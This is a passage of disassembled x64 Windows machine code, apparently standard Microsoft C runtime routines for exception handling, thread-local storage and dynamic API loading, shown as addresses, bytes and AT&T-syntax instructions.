   140001e19:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140001e1d:	75 4d                	jne    0x140001e6c
   140001e1f:	8b 41 20             	mov    0x20(%rcx),%eax
   140001e22:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140001e27:	83 f8 02             	cmp    $0x2,%eax
   140001e2a:	77 40                	ja     0x140001e6c
   140001e2c:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140001e30:	48 85 c0             	test   %rax,%rax
   140001e33:	74 37                	je     0x140001e6c
   140001e35:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140001e39:	85 d2                	test   %edx,%edx
   140001e3b:	74 11                	je     0x140001e4e
   140001e3d:	48 03 51 38          	add    0x38(%rcx),%rdx
   140001e41:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140001e45:	e8 2a 00 00 00       	call   0x140001e74
   140001e4a:	eb 20                	jmp    0x140001e6c
   140001e4c:	eb 1e                	jmp    0x140001e6c
   140001e4e:	f6 00 10             	testb  $0x10,(%rax)
   140001e51:	74 19                	je     0x140001e6c
   140001e53:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140001e57:	48 8b 08             	mov    (%rax),%rcx
   140001e5a:	48 85 c9             	test   %rcx,%rcx
   140001e5d:	74 0d                	je     0x140001e6c
   140001e5f:	48 8b 01             	mov    (%rcx),%rax
   140001e62:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001e66:	ff 15 f4 c3 00 00    	call   *0xc3f4(%rip)        # 0x14000e260
   140001e6c:	48 83 c4 48          	add    $0x48,%rsp
   140001e70:	c3                   	ret
   140001e71:	cc                   	int3
   140001e72:	cc                   	int3
   140001e73:	cc                   	int3
   140001e74:	48 ff e2             	rex.W jmp *%rdx
   140001e77:	cc                   	int3
   140001e78:	40 53                	rex push %rbx
   140001e7a:	48 83 ec 20          	sub    $0x20,%rsp
   140001e7e:	48 8b d9             	mov    %rcx,%rbx
   140001e81:	e8 a6 01 00 00       	call   0x14000202c
   140001e86:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140001e8a:	eb 09                	jmp    0x140001e95
   140001e8c:	48 39 1a             	cmp    %rbx,(%rdx)
   140001e8f:	74 12                	je     0x140001ea3
   140001e91:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140001e95:	48 85 d2             	test   %rdx,%rdx
   140001e98:	75 f2                	jne    0x140001e8c
   140001e9a:	8d 42 01             	lea    0x1(%rdx),%eax
   140001e9d:	48 83 c4 20          	add    $0x20,%rsp
   140001ea1:	5b                   	pop    %rbx
   140001ea2:	c3                   	ret
   140001ea3:	33 c0                	xor    %eax,%eax
   140001ea5:	eb f6                	jmp    0x140001e9d
   140001ea7:	cc                   	int3
   140001ea8:	48 63 02             	movslq (%rdx),%rax
   140001eab:	48 03 c1             	add    %rcx,%rax
   140001eae:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140001eb2:	7c 16                	jl     0x140001eca
   140001eb4:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140001eb8:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140001ebc:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   140001ec0:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   140001ec4:	4d 03 c1             	add    %r9,%r8
   140001ec7:	49 03 c0             	add    %r8,%rax
   140001eca:	c3                   	ret
   140001ecb:	cc                   	int3
   140001ecc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001ed1:	57                   	push   %rdi
   140001ed2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ed6:	48 8b 39             	mov    (%rcx),%rdi
   140001ed9:	48 8b d9             	mov    %rcx,%rbx
   140001edc:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140001ee2:	74 12                	je     0x140001ef6
   140001ee4:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140001eea:	74 0a                	je     0x140001ef6
   140001eec:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140001ef2:	74 22                	je     0x140001f16
   140001ef4:	eb 13                	jmp    0x140001f09
   140001ef6:	e8 31 01 00 00       	call   0x14000202c
   140001efb:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140001eff:	7e 08                	jle    0x140001f09
   140001f01:	e8 26 01 00 00       	call   0x14000202c
   140001f06:	ff 48 30             	decl   0x30(%rax)
   140001f09:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f0e:	33 c0                	xor    %eax,%eax
   140001f10:	48 83 c4 20          	add    $0x20,%rsp
   140001f14:	5f                   	pop    %rdi
   140001f15:	c3                   	ret
   140001f16:	e8 11 01 00 00       	call   0x14000202c
   140001f1b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140001f1f:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140001f23:	e8 04 01 00 00       	call   0x14000202c
   140001f28:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140001f2c:	e8 ef 36 00 00       	call   0x140005620
   140001f31:	cc                   	int3
   140001f32:	cc                   	int3
   140001f33:	cc                   	int3
   140001f34:	48 83 ec 28          	sub    $0x28,%rsp
   140001f38:	e8 ef 00 00 00       	call   0x14000202c
   140001f3d:	48 83 c0 20          	add    $0x20,%rax
   140001f41:	48 83 c4 28          	add    $0x28,%rsp
   140001f45:	c3                   	ret
   140001f46:	cc                   	int3
   140001f47:	cc                   	int3
   140001f48:	48 83 ec 28          	sub    $0x28,%rsp
   140001f4c:	e8 db 00 00 00       	call   0x14000202c
   140001f51:	48 83 c0 28          	add    $0x28,%rax
   140001f55:	48 83 c4 28          	add    $0x28,%rsp
   140001f59:	c3                   	ret
   140001f5a:	cc                   	int3
   140001f5b:	cc                   	int3
   140001f5c:	48 83 ec 28          	sub    $0x28,%rsp
   140001f60:	e8 bb 36 00 00       	call   0x140005620
   140001f65:	cc                   	int3
   140001f66:	cc                   	int3
   140001f67:	cc                   	int3
   140001f68:	cc                   	int3
   140001f69:	cc                   	int3
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	cc                   	int3
   140001f71:	cc                   	int3
   140001f72:	cc                   	int3
   140001f73:	cc                   	int3
   140001f74:	cc                   	int3
   140001f75:	cc                   	int3
   140001f76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001f7d:	00 00 00 
   140001f80:	cc                   	int3
   140001f81:	cc                   	int3
   140001f82:	cc                   	int3
   140001f83:	cc                   	int3
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001f8d:	00 00 00 
   140001f90:	cc                   	int3
   140001f91:	cc                   	int3
   140001f92:	cc                   	int3
   140001f93:	cc                   	int3
   140001f94:	cc                   	int3
   140001f95:	cc                   	int3
   140001f96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001f9d:	00 00 00 
   140001fa0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001fa5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140001faa:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140001faf:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140001fb6:	e9 05 00 00 00       	jmp    0x140001fc0
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	c3                   	ret
   140001fc1:	cc                   	int3
   140001fc2:	cc                   	int3
   140001fc3:	cc                   	int3
   140001fc4:	cc                   	int3
   140001fc5:	cc                   	int3
   140001fc6:	cc                   	int3
   140001fc7:	cc                   	int3
   140001fc8:	cc                   	int3
   140001fc9:	cc                   	int3
   140001fca:	cc                   	int3
   140001fcb:	cc                   	int3
   140001fcc:	cc                   	int3
   140001fcd:	cc                   	int3
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	c3                   	ret
   140001fd1:	cc                   	int3
   140001fd2:	cc                   	int3
   140001fd3:	cc                   	int3
   140001fd4:	48 8b 05 75 c2 00 00 	mov    0xc275(%rip),%rax        # 0x14000e250
   140001fdb:	48 8d 15 aa f5 ff ff 	lea    -0xa56(%rip),%rdx        # 0x14000158c
   140001fe2:	48 3b c2             	cmp    %rdx,%rax
   140001fe5:	74 23                	je     0x14000200a
   140001fe7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001fee:	00 00 
   140001ff0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140001ff7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140001ffb:	72 06                	jb     0x140002003
   140001ffd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140002001:	76 07                	jbe    0x14000200a
   140002003:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002008:	cd 29                	int    $0x29
   14000200a:	c3                   	ret
   14000200b:	cc                   	int3
   14000200c:	48 83 ec 28          	sub    $0x28,%rsp
   140002010:	48 85 c9             	test   %rcx,%rcx
   140002013:	74 11                	je     0x140002026
   140002015:	48 8d 05 44 6b 01 00 	lea    0x16b44(%rip),%rax        # 0x140018b60
   14000201c:	48 3b c8             	cmp    %rax,%rcx
   14000201f:	74 05                	je     0x140002026
   140002021:	e8 26 36 00 00       	call   0x14000564c
   140002026:	48 83 c4 28          	add    $0x28,%rsp
   14000202a:	c3                   	ret
   14000202b:	cc                   	int3
   14000202c:	48 83 ec 28          	sub    $0x28,%rsp
   140002030:	e8 13 00 00 00       	call   0x140002048
   140002035:	48 85 c0             	test   %rax,%rax
   140002038:	74 05                	je     0x14000203f
   14000203a:	48 83 c4 28          	add    $0x28,%rsp
   14000203e:	c3                   	ret
   14000203f:	e8 84 36 00 00       	call   0x1400056c8
   140002044:	cc                   	int3
   140002045:	cc                   	int3
   140002046:	cc                   	int3
   140002047:	cc                   	int3
   140002048:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000204d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002052:	57                   	push   %rdi
   140002053:	48 83 ec 20          	sub    $0x20,%rsp
   140002057:	83 3d 32 60 01 00 ff 	cmpl   $0xffffffff,0x16032(%rip)        # 0x140018090
   14000205e:	75 07                	jne    0x140002067
   140002060:	33 c0                	xor    %eax,%eax
   140002062:	e9 90 00 00 00       	jmp    0x1400020f7
   140002067:	ff 15 23 c0 00 00    	call   *0xc023(%rip)        # 0x14000e090
   14000206d:	8b 0d 1d 60 01 00    	mov    0x1601d(%rip),%ecx        # 0x140018090
   140002073:	8b f8                	mov    %eax,%edi
   140002075:	e8 5a 03 00 00       	call   0x1400023d4
   14000207a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000207e:	33 f6                	xor    %esi,%esi
   140002080:	48 3b c2             	cmp    %rdx,%rax
   140002083:	74 67                	je     0x1400020ec
   140002085:	48 85 c0             	test   %rax,%rax
   140002088:	74 05                	je     0x14000208f
   14000208a:	48 8b f0             	mov    %rax,%rsi
   14000208d:	eb 5d                	jmp    0x1400020ec
   14000208f:	8b 0d fb 5f 01 00    	mov    0x15ffb(%rip),%ecx        # 0x140018090
   140002095:	e8 82 03 00 00       	call   0x14000241c
   14000209a:	85 c0                	test   %eax,%eax
   14000209c:	74 4e                	je     0x1400020ec
   14000209e:	ba 80 00 00 00       	mov    $0x80,%edx
   1400020a3:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   1400020a6:	e8 75 36 00 00       	call   0x140005720
   1400020ab:	8b 0d df 5f 01 00    	mov    0x15fdf(%rip),%ecx        # 0x140018090
   1400020b1:	48 8b d8             	mov    %rax,%rbx
   1400020b4:	48 85 c0             	test   %rax,%rax
   1400020b7:	74 24                	je     0x1400020dd
   1400020b9:	48 8b d0             	mov    %rax,%rdx
   1400020bc:	e8 5b 03 00 00       	call   0x14000241c
   1400020c1:	85 c0                	test   %eax,%eax
   1400020c3:	74 12                	je     0x1400020d7
   1400020c5:	48 8b c3             	mov    %rbx,%rax
   1400020c8:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   1400020cf:	48 8b de             	mov    %rsi,%rbx
   1400020d2:	48 8b f0             	mov    %rax,%rsi
   1400020d5:	eb 0d                	jmp    0x1400020e4
   1400020d7:	8b 0d b3 5f 01 00    	mov    0x15fb3(%rip),%ecx        # 0x140018090
   1400020dd:	33 d2                	xor    %edx,%edx
   1400020df:	e8 38 03 00 00       	call   0x14000241c
   1400020e4:	48 8b cb             	mov    %rbx,%rcx
   1400020e7:	e8 60 35 00 00       	call   0x14000564c
   1400020ec:	8b cf                	mov    %edi,%ecx
   1400020ee:	ff 15 a4 bf 00 00    	call   *0xbfa4(%rip)        # 0x14000e098
   1400020f4:	48 8b c6             	mov    %rsi,%rax
   1400020f7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400020fc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002101:	48 83 c4 20          	add    $0x20,%rsp
   140002105:	5f                   	pop    %rdi
   140002106:	c3                   	ret
   140002107:	cc                   	int3
   140002108:	48 83 ec 28          	sub    $0x28,%rsp
   14000210c:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x14000200c
   140002113:	e8 2c 02 00 00       	call   0x140002344
   140002118:	89 05 72 5f 01 00    	mov    %eax,0x15f72(%rip)        # 0x140018090
   14000211e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002121:	74 25                	je     0x140002148
   140002123:	48 8d 15 36 6a 01 00 	lea    0x16a36(%rip),%rdx        # 0x140018b60
   14000212a:	8b c8                	mov    %eax,%ecx
   14000212c:	e8 eb 02 00 00       	call   0x14000241c
   140002131:	85 c0                	test   %eax,%eax
   140002133:	74 0e                	je     0x140002143
   140002135:	c7 05 99 6a 01 00 fe 	movl   $0xfffffffe,0x16a99(%rip)        # 0x140018bd8
   14000213c:	ff ff ff 
   14000213f:	b0 01                	mov    $0x1,%al
   140002141:	eb 07                	jmp    0x14000214a
   140002143:	e8 08 00 00 00       	call   0x140002150
   140002148:	32 c0                	xor    %al,%al
   14000214a:	48 83 c4 28          	add    $0x28,%rsp
   14000214e:	c3                   	ret
   14000214f:	cc                   	int3
   140002150:	48 83 ec 28          	sub    $0x28,%rsp
   140002154:	8b 0d 36 5f 01 00    	mov    0x15f36(%rip),%ecx        # 0x140018090
   14000215a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000215d:	74 0c                	je     0x14000216b
   14000215f:	e8 28 02 00 00       	call   0x14000238c
   140002164:	83 0d 25 5f 01 00 ff 	orl    $0xffffffff,0x15f25(%rip)        # 0x140018090
   14000216b:	b0 01                	mov    $0x1,%al
   14000216d:	48 83 c4 28          	add    $0x28,%rsp
   140002171:	c3                   	ret
   140002172:	cc                   	int3
   140002173:	cc                   	int3
   140002174:	40 53                	rex push %rbx
   140002176:	48 83 ec 20          	sub    $0x20,%rsp
   14000217a:	33 db                	xor    %ebx,%ebx
   14000217c:	48 8d 15 5d 6a 01 00 	lea    0x16a5d(%rip),%rdx        # 0x140018be0
   140002183:	45 33 c0             	xor    %r8d,%r8d
   140002186:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000218a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000218e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140002193:	e8 d8 02 00 00       	call   0x140002470
   140002198:	85 c0                	test   %eax,%eax
   14000219a:	74 11                	je     0x1400021ad
   14000219c:	ff 05 66 6a 01 00    	incl   0x16a66(%rip)        # 0x140018c08
   1400021a2:	ff c3                	inc    %ebx
   1400021a4:	83 fb 01             	cmp    $0x1,%ebx
   1400021a7:	72 d3                	jb     0x14000217c
   1400021a9:	b0 01                	mov    $0x1,%al
   1400021ab:	eb 07                	jmp    0x1400021b4
   1400021ad:	e8 0a 00 00 00       	call   0x1400021bc
   1400021b2:	32 c0                	xor    %al,%al
   1400021b4:	48 83 c4 20          	add    $0x20,%rsp
   1400021b8:	5b                   	pop    %rbx
   1400021b9:	c3                   	ret
   1400021ba:	cc                   	int3
   1400021bb:	cc                   	int3
   1400021bc:	40 53                	rex push %rbx
   1400021be:	48 83 ec 20          	sub    $0x20,%rsp
   1400021c2:	8b 1d 40 6a 01 00    	mov    0x16a40(%rip),%ebx        # 0x140018c08
   1400021c8:	eb 1d                	jmp    0x1400021e7
   1400021ca:	48 8d 05 0f 6a 01 00 	lea    0x16a0f(%rip),%rax        # 0x140018be0
   1400021d1:	ff cb                	dec    %ebx
   1400021d3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400021d7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400021db:	ff 15 cf be 00 00    	call   *0xbecf(%rip)        # 0x14000e0b0
   1400021e1:	ff 0d 21 6a 01 00    	decl   0x16a21(%rip)        # 0x140018c08
   1400021e7:	85 db                	test   %ebx,%ebx
   1400021e9:	75 df                	jne    0x1400021ca
   1400021eb:	b0 01                	mov    $0x1,%al
   1400021ed:	48 83 c4 20          	add    $0x20,%rsp
   1400021f1:	5b                   	pop    %rbx
   1400021f2:	c3                   	ret
   1400021f3:	cc                   	int3
   1400021f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400021f9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400021fe:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002203:	57                   	push   %rdi
   140002204:	41 54                	push   %r12
   140002206:	41 55                	push   %r13
   140002208:	41 56                	push   %r14
   14000220a:	41 57                	push   %r15
   14000220c:	48 83 ec 20          	sub    $0x20,%rsp
   140002210:	8b f9                	mov    %ecx,%edi
   140002212:	4c 8d 3d e7 dd ff ff 	lea    -0x2219(%rip),%r15        # 0x140000000
   140002219:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   14000221d:	4d 8b e1             	mov    %r9,%r12
   140002220:	49 8b e8             	mov    %r8,%rbp
   140002223:	4c 8b ea             	mov    %rdx,%r13
   140002226:	49 8b 84 ff 90 8c 01 	mov    0x18c90(%r15,%rdi,8),%rax
   14000222d:	00 
   14000222e:	90                   	nop
   14000222f:	49 3b c6             	cmp    %r14,%rax
   140002232:	0f 84 ae 00 00 00    	je     0x1400022e6
   140002238:	48 85 c0             	test   %rax,%rax
   14000223b:	0f 85 a7 00 00 00    	jne    0x1400022e8
   140002241:	4d 3b c1             	cmp    %r9,%r8
   140002244:	0f 84 94 00 00 00    	je     0x1400022de
   14000224a:	8b 75 00             	mov    0x0(%rbp),%esi
   14000224d:	49 8b 9c f7 78 8c 01 	mov    0x18c78(%r15,%rsi,8),%rbx
   140002254:	00 
   140002255:	90                   	nop
   140002256:	48 85 db             	test   %rbx,%rbx
   140002259:	74 0b                	je     0x140002266
   14000225b:	49 3b de             	cmp    %r14,%rbx
   14000225e:	0f 85 c1 00 00 00    	jne    0x140002325
   140002264:	eb 6b                	jmp    0x1400022d1
   140002266:	4d 8b bc f7 38 f1 00 	mov    0xf138(%r15,%rsi,8),%r15
   14000226d:	00 
   14000226e:	33 d2                	xor    %edx,%edx
   140002270:	49 8b cf             	mov    %r15,%rcx
   140002273:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002279:	ff 15 71 be 00 00    	call   *0xbe71(%rip)        # 0x14000e0f0
   14000227f:	48 8b d8             	mov    %rax,%rbx
   140002282:	48 85 c0             	test   %rax,%rax
   140002285:	75 7e                	jne    0x140002305
   140002287:	ff 15 03 be 00 00    	call   *0xbe03(%rip)        # 0x14000e090
   14000228d:	83 f8 57             	cmp    $0x57,%eax
   140002290:	75 2d                	jne    0x1400022bf
   140002292:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140002296:	49 8b cf             	mov    %r15,%rcx
   140002299:	48 8d 15 48 cf 00 00 	lea    0xcf48(%rip),%rdx        # 0x14000f1e8
   1400022a0:	e8 0b 36 00 00       	call   0x1400058b0
   1400022a5:	85 c0                	test   %eax,%eax
   1400022a7:	74 16                	je     0x1400022bf
   1400022a9:	45 33 c0             	xor    %r8d,%r8d
   1400022ac:	33 d2                	xor    %edx,%edx
   1400022ae:	49 8b cf             	mov    %r15,%rcx
   1400022b1:	ff 15 39 be 00 00    	call   *0xbe39(%rip)        # 0x14000e0f0
   1400022b7:	48 8b d8             	mov    %rax,%rbx
   1400022ba:	48 85 c0             	test   %rax,%rax
   1400022bd:	75 46                	jne    0x140002305
   1400022bf:	49 8b c6             	mov    %r14,%rax
   1400022c2:	4c 8d 3d 37 dd ff ff 	lea    -0x22c9(%rip),%r15        # 0x140000000
   1400022c9:	49 87 84 f7 78 8c 01 	xchg   %rax,0x18c78(%r15,%rsi,8)
   1400022d0:	00 
   1400022d1:	48 83 c5 04          	add    $0x4,%rbp
   1400022d5:	49 3b ec             	cmp    %r12,%rbp
   1400022d8:	0f 85 6c ff ff ff    	jne    0x14000224a
   1400022de:	4d 87 b4 ff 90 8c 01 	xchg   %r14,0x18c90(%r15,%rdi,8)
   1400022e5:	00 
   1400022e6:	33 c0                	xor    %eax,%eax
   1400022e8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400022ed:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400022f2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400022f7:	48 83 c4 20          	add    $0x20,%rsp
   1400022fb:	41 5f                	pop    %r15
   1400022fd:	41 5e                	pop    %r14
   1400022ff:	41 5d                	pop    %r13
   140002301:	41 5c                	pop    %r12
   140002303:	5f                   	pop    %rdi
   140002304:	c3                   	ret
   140002305:	48 8b c3             	mov    %rbx,%rax
   140002308:	4c 8d 3d f1 dc ff ff 	lea    -0x230f(%rip),%r15        # 0x140000000
   14000230f:	49 87 84 f7 78 8c 01 	xchg   %rax,0x18c78(%r15,%rsi,8)
   140002316:	00 
   140002317:	48 85 c0             	test   %rax,%rax
   14000231a:	74 09                	je     0x140002325
   14000231c:	48 8b cb             	mov    %rbx,%rcx
   14000231f:	ff 15 bb bd 00 00    	call   *0xbdbb(%rip)        # 0x14000e0e0
   140002325:	49 8b d5             	mov    %r13,%rdx
   140002328:	48 8b cb             	mov    %rbx,%rcx
   14000232b:	ff 15 b7 bd 00 00    	call   *0xbdb7(%rip)        # 0x14000e0e8
   140002331:	48 85 c0             	test   %rax,%rax
   140002334:	74 a8                	je     0x1400022de
   140002336:	48 8b c8             	mov    %rax,%rcx
   140002339:	49 87 8c ff 90 8c 01 	xchg   %rcx,0x18c90(%r15,%rdi,8)
   140002340:	00 
   140002341:	eb a5                	jmp    0x1400022e8
   140002343:	cc                   	int3
   140002344:	40 53                	rex push %rbx
   140002346:	48 83 ec 20          	sub    $0x20,%rsp
   14000234a:	48 8b d9             	mov    %rcx,%rbx
   14000234d:	4c 8d 0d ac ce 00 00 	lea    0xceac(%rip),%r9        # 0x14000f200
   140002354:	33 c9                	xor    %ecx,%ecx
   140002356:	4c 8d 05 9b ce 00 00 	lea    0xce9b(%rip),%r8        # 0x14000f1f8
   14000235d:	48 8d 15 9c ce 00 00 	lea    0xce9c(%rip),%rdx        # 0x14000f200
   140002364:	e8 8b fe ff ff       	call   0x1400021f4
   140002369:	48 85 c0             	test   %rax,%rax
   14000236c:	74 0f                	je     0x14000237d
   14000236e:	48 8b cb             	mov    %rbx,%rcx
   140002371:	48 83 c4 20          	add    $0x20,%rsp
   140002375:	5b                   	pop    %rbx
   140002376:	48 ff 25 e3 be 00 00 	rex.W jmp *0xbee3(%rip)        # 0x14000e260
   14000237d:	48 83 c4 20          	add    $0x20,%rsp
   140002381:	5b                   	pop    %rbx
   140002382:	48 ff 25 37 bd 00 00 	rex.W jmp *0xbd37(%rip)        # 0x14000e0c0
   140002389:	cc                   	int3
   14000238a:	cc                   	int3
   14000238b:	cc                   	int3
   14000238c:	40 53                	rex push %rbx
   14000238e:	48 83 ec 20          	sub    $0x20,%rsp
   140002392:	8b d9                	mov    %ecx,%ebx
   140002394:	4c 8d 0d 7d ce 00 00 	lea    0xce7d(%rip),%r9        # 0x14000f218
   14000239b:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400023a0:	4c 8d 05 69 ce 00 00 	lea    0xce69(%rip),%r8        # 0x14000f210
   1400023a7:	48 8d 15 6a ce 00 00 	lea    0xce6a(%rip),%rdx        # 0x14000f218
   1400023ae:	e8 41 fe ff ff       	call   0x1400021f4
   1400023b3:	8b cb                	mov    %ebx,%ecx
   1400023b5:	48 85 c0             	test   %rax,%rax
   1400023b8:	74 0c                	je     0x1400023c6
   1400023ba:	48 83 c4 20          	add    $0x20,%rsp
   1400023be:	5b                   	pop    %rbx
   1400023bf:	48 ff 25 9a be 00 00 	rex.W jmp *0xbe9a(%rip)        # 0x14000e260
   1400023c6:	48 83 c4 20          	add    $0x20,%rsp
   1400023ca:	5b                   	pop    %rbx
   1400023cb:	48 ff 25 06 bd 00 00 	rex.W jmp *0xbd06(%rip)        # 0x14000e0d8
   1400023d2:	cc                   	int3
   1400023d3:	cc                   	int3
   1400023d4:	40 53                	rex push %rbx
   1400023d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400023da:	8b d9                	mov    %ecx,%ebx
   1400023dc:	4c 8d 0d 45 ce 00 00 	lea    0xce45(%rip),%r9        # 0x14000f228
   1400023e3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400023e8:	4c 8d 05 31 ce 00 00 	lea    0xce31(%rip),%r8        # 0x14000f220
   1400023ef:	48 8d 15 32 ce 00 00 	lea    0xce32(%rip),%rdx        # 0x14000f228
   1400023f6:	e8 f9 fd ff ff       	call   0x1400021f4
   1400023fb:	8b cb                	mov    %ebx,%ecx
   1400023fd:	48 85 c0             	test   %rax,%rax
   140002400:	74 0c                	je     0x14000240e
   140002402:	48 83 c4 20          	add    $0x20,%rsp
   140002406:	5b                   	pop    %rbx
   140002407:	48 ff 25 52 be 00 00 	rex.W jmp *0xbe52(%rip)        # 0x14000e260
   14000240e:	48 83 c4 20          	add    $0x20,%rsp
   140002412:	5b                   	pop    %rbx
   140002413:	48 ff 25 ae bc 00 00 	rex.W jmp *0xbcae(%rip)        # 0x14000e0c8
   14000241a:	cc                   	int3
   14000241b:	cc                   	int3
   14000241c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002421:	57                   	push   %rdi
   140002422:	48 83 ec 20          	sub    $0x20,%rsp
   140002426:	48 8b da             	mov    %rdx,%rbx
   140002429:	4c 8d 0d 10 ce 00 00 	lea    0xce10(%rip),%r9        # 0x14000f240
   140002430:	8b f9                	mov    %ecx,%edi
   140002432:	48 8d 15 07 ce 00 00 	lea    0xce07(%rip),%rdx        # 0x14000f240
   140002439:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000243e:	4c 8d 05 f3 cd 00 00 	lea    0xcdf3(%rip),%r8        # 0x14000f238
   140002445:	e8 aa fd ff ff       	call   0x1400021f4
   14000244a:	48 8b d3             	mov    %rbx,%rdx
   14000244d:	8b cf                	mov    %edi,%ecx
   14000244f:	48 85 c0             	test   %rax,%rax
   140002452:	74 08                	je     0x14000245c
   140002454:	ff 15 06 be 00 00    	call   *0xbe06(%rip)        # 0x14000e260
   14000245a:	eb 06                	jmp    0x140002462
   14000245c:	ff 15 6e bc 00 00    	call   *0xbc6e(%rip)        # 0x14000e0d0
   140002462:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002467:	48 83 c4 20          	add    $0x20,%rsp
   14000246b:	5f                   	pop    %rdi
   14000246c:	c3                   	ret
   14000246d:	cc                   	int3
   14000246e:	cc                   	int3
   14000246f:	cc                   	int3
   140002470:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002475:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000247a:	57                   	push   %rdi
   14000247b:	48 83 ec 20          	sub    $0x20,%rsp
   14000247f:	41 8b f0             	mov    %r8d,%esi
   140002482:	4c 8d 0d cf cd 00 00 	lea    0xcdcf(%rip),%r9        # 0x14000f258
   140002489:	8b da                	mov    %edx,%ebx
   14000248b:	4c 8d 05 be cd 00 00 	lea    0xcdbe(%rip),%r8        # 0x14000f250
   140002492:	48 8b f9             	mov    %rcx,%rdi
   140002495:	48 8d 15 bc cd 00 00 	lea    0xcdbc(%rip),%rdx        # 0x14000f258
   14000249c:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400024a1:	e8 4e fd ff ff       	call   0x1400021f4
   1400024a6:	8b d3                	mov    %ebx,%edx
   1400024a8:	48 8b cf             	mov    %rdi,%rcx
   1400024ab:	48 85 c0             	test   %rax,%rax
   1400024ae:	74 0b                	je     0x1400024bb
   1400024b0:	44 8b c6             	mov    %esi,%r8d
   1400024b3:	ff 15 a7 bd 00 00    	call   *0xbda7(%rip)        # 0x14000e260
   1400024b9:	eb 06                	jmp    0x1400024c1
   1400024bb:	ff 15 f7 bb 00 00    	call   *0xbbf7(%rip)        # 0x14000e0b8
   1400024c1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400024c6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400024cb:	48 83 c4 20          	add    $0x20,%rsp
   1400024cf:	5f                   	pop    %rdi
   1400024d0:	c3                   	ret
   1400024d1:	cc                   	int3
   1400024d2:	cc                   	int3
   1400024d3:	cc                   	int3
   1400024d4:	48 8b c4             	mov    %rsp,%rax
   1400024d7:	4c 89 48 20          	mov    %r9,0x20(%rax)
